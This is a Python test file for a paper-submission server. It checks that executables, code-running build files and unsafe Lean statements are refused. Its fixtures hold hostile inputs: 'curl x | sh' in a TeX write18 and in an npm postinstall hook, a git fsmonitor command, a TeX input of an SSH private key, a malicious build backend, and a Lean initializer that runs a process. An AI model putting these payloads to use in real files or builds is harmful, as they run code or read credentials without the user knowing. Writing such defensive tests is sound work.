"""Programs are not accepted: not in bundles, not inside archives in bundles, not as artifacts;
nor files that run code when built, opened or loaded, nor problem statements that run code."""

from __future__ import annotations

import io
import json
import zipfile

from proofxiv_server.core.bundle_safety import unsafe_files
from proofxiv_server.core.bundles import executable_kind

from .conftest import agent, login, make_bundle

ELF = b"\x7fELF\x02\x01\x01" + b"\0" * 64
PE = b"MZ" + b"\0" * 58 + (64).to_bytes(4, "little") + b"PE\0\0" + b"\0" * 64

MANIFEST = json.dumps(
    {
        "title": "A paper that tries to ship a program",
        "abstract": "Nothing to see here; this is a test of the bundle checks.",
        "byline": "Claude (AI model by Anthropic) — run by mallory",
        "claims": [{"key": "main", "kind": "informal", "statement": "Something informal."}],
        "novelty": {"what_is_new": "Nothing."},
        "files": {"pdf": "paper.pdf"},
    }
)


def zipped(name: str, data: bytes) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        zf.writestr(name, data)
    return buf.getvalue()


def test_executable_kinds():
    assert executable_kind("tool", ELF) == "ELF binary"
    assert executable_kind("data.bin", PE) == "Windows program"
    assert executable_kind("x.exe", b"anything") == ".exe file"
    assert executable_kind("Main.class", b"\xca\xfe\xba\xbe\0\0") == ".class file"
    assert executable_kind("notes.txt", b"MZ is how the notes start, not a program") is None
    assert executable_kind("verify.py", b"#!/usr/bin/env python3\nprint(1)\n") is None
    assert executable_kind("paper.pdf", b"%PDF-1.7") is None


async def test_programs_are_refused(transport):
    mallory = await agent(transport, await login(transport, "mallory"), "mallory-agent")

    async def submit(extra: dict[str, bytes | str], expect: int):
        bundle = make_bundle({"paper.json": MANIFEST, "paper.pdf": b"%PDF mallory", **extra})
        return await mallory.post("/papers", files={"bundle": ("p.tar.gz", bundle, "application/gzip")}, expect=expect)

    refused = await submit({"tools/solver": ELF}, 422)
    assert "tools/solver: programs are not accepted (ELF binary)" in refused["message"]
    await submit({"run.exe": b"not even a real exe"}, 422)
    await submit({"data/tools.zip": zipped("bin/helper", ELF)}, 422)
    await submit({"data/inputs.zip": zipped("inputs.csv", b"1,2,3\n")}, 200)  # data archives are fine

    await mallory.post("/artifacts", files={"file": ("log.txt", ELF, "application/octet-stream")}, expect=422)
    await mallory.post("/artifacts", files={"file": ("log.txt", b"an ordinary log\n", "text/plain")})


LAKEFILE_OK = """name = "paper"
defaultTargets = ["Paper"]

[[require]]
name = "mathlib"
scope = "leanprover-community"
rev = "v4.35.0"

[[lean_lib]]
name = "Paper"
"""


def test_files_that_run_code_by_surprise():
    def why(files: dict[str, bytes | str]) -> list[str]:
        return unsafe_files({k: v.encode() if isinstance(v, str) else v for k, v in files.items()})

    assert why({
        "lean/Main.lean": "theorem t : 1 + 1 = 2 := by norm_num\n#guard 2 + 2 == 4\n",
        "lakefile.toml": LAKEFILE_OK,
        "scripts/verify.py": "import json\nprint(json.dumps(1))\n",
        "data/table.npy": b"\x93NUMPY",
        "paper.tex": "\\documentclass{article}\\input{sections/intro}",
        "package.json": '{"scripts": {"test": "node t.js"}}',
        "pyproject.toml": '[build-system]\nrequires = ["hatchling"]\nbuild-backend = "hatchling.build"\n',
    }) == []
    cases = {
        "lean/Defs.lean": ("#eval IO.Process.run {cmd := \"sh\"}", "runs code when compiled"),
        "lakefile.lean": ("import Lake", "lakefile.toml"),
        ".git/config": ("[core]\nfsmonitor = sh evil.sh", ".git/"),
        ".vscode/tasks.json": ("{}", ".vscode/"),
        "data/model.pkl": (b"\x80\x04", "loaded"),
        "scripts/json.py": ("print(1)", "json"),
        "setup.py": ("import os", "setup.py"),
        "main.tex": ("\\immediate\\write18{curl x | sh}", "run commands"),
        "notes.tex": ("\\input{/home/user/.ssh/id_rsa}", "outside"),
        ".latexmkrc": ("system('x')", "latexmk"),
        "package.json": ('{"scripts": {"postinstall": "curl x | sh"}}', "postinstall"),
        "pyproject.toml": ('[build-system]\nrequires = ["evil-backend"]\nbuild-backend = "evil"\n', "evil"),
        "lake-manifest.json": ('{"packages": [{"type": "git", "name": "x", "url": "https://github.com/mallory/x"}]}', "mallory"),
        "data/bundle.zip": (zipped(".git/hooks/post-checkout", b"sh"), ".git/"),
    }
    for path, (content, expected) in cases.items():
        problems = why({path: content})
        assert problems and expected in problems[0], (path, problems)
    foreign = why({"lakefile.toml": LAKEFILE_OK + '\n[[require]]\nname = "evil"\ngit = "https://github.com/mallory/evil"\n'})
    assert any("evil" in p and "only Mathlib" in p for p in foreign), foreign
    extra = why({"lakefile.toml": LAKEFILE_OK + 'moreLeanArgs = ["--load-dynlib=x.so"]\n'})
    assert any("moreLeanArgs" in p for p in extra), extra


async def test_unsafe_bundles_and_statements_are_refused(transport):
    mallory = await agent(transport, await login(transport, "mallory2"), "mallory2-agent")
    bundle = make_bundle({"paper.json": MANIFEST, "paper.pdf": b"%PDF mallory", "lakefile.lean": "import Lake"})
    refused = await mallory.post("/papers", files={"bundle": ("p.tar.gz", bundle, "application/gzip")}, expect=422)
    assert "lakefile.lean" in refused["message"] and refused["details"]["problems"]

    proposal = {
        "title": "A problem whose statement runs code",
        "statement_md": "Is this statement safe to compile? It is not.",
        "domain": "combinatorics",
        "sources": [{"url": "https://example.org/x"}],
        "openness_evidence": "Nothing was searched; this is a test.",
        "formalizable": True,
    }
    for lean, expected in (
        ("initialize evil : Unit ← IO.Process.exit 0\ntheorem x : True := by sorry", "runs code when compiled"),
        ("import Evil\ntheorem x : True := by sorry", "import"),
        ("axiom cheat : False\ntheorem x : True := by sorry", "axiom"),
    ):
        refused = await mallory.post("/problems", json={**proposal, "lean_statement": lean}, expect=422)
        assert expected in refused["message"], refused
    ok = await mallory.post("/problems", json={**proposal, "title": "A safe statement", "lean_statement": "theorem x (n : ℕ) : n = n := by\n  sorry"})
    assert ok["problem"]["status"] == "proposed"
